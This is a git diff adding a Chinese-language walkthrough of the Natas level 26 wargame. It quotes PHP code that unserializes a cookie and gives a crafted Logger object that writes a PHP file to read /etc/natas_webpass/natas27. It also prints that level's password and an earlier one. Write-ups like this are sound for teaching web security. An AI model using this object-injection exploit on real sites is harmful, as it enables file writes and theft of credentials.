@@ -897,3 +897,82 @@ function logRequest($message){
 ```text
 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 ```
+
+###Level26
+PHP源码，只贴核心部分
+```php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        $this->exitMsg="#--session end--#\n";
+        $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+        // write initial message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$initMsg);
+        fclose($fd);
+    }                       
+
+    function __destruct(){
+        // write exit message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$this->exitMsg);
+        fclose($fd);
+    }
+}
+
+function drawImage($filename){
+    $img=imagecreatetruecolor(400,300);
+    drawFromUserdata($img);
+    imagepng($img,$filename);
+    imagedestroy($img);
+}
+
+function drawFromUserdata($img){
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    }    
+}
+    
+function storeData(){
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    }
+}
+
+if (array_key_exists("drawing", $_COOKIE) ||
+    (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
+    $imgfile="img/natas26_" . session_id() .".png"; 
+    drawImage($imgfile); 
+    showImage($imgfile);
+    storeData();
+}
+```
+发现用到了`unserialize`，代码里还有个奇怪的Logger。于是自己试了试，发现`serialize`会把实例内部属性给dump出来，然后`unserialize`的时候会去读属性，这样构造函数不一定能用上，不过析构函数是肯定可以用得上的…于是写了下面的php代码来试图往img目录里写一个php文件
+```php
+<?php
+class Logger{
+    private $logFile="img/yoooo.php";
+    private $initMsg="<?php include('/etc/natas_webpass/natas27'); ?> ";
+    private $exitMsg="<?php include('/etc/natas_webpass/natas27'); ?>";
+
+    function __construct($file){
+    }
+    function log($msg){
+    }
+    function __destruct(){
+    }
+}
+echo urlencode(base64_encode(serialize(new Logger(""))));
+?>
+```
+然后访问`img/yoooo.php`，拿到natas27的密码
+```text
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+```
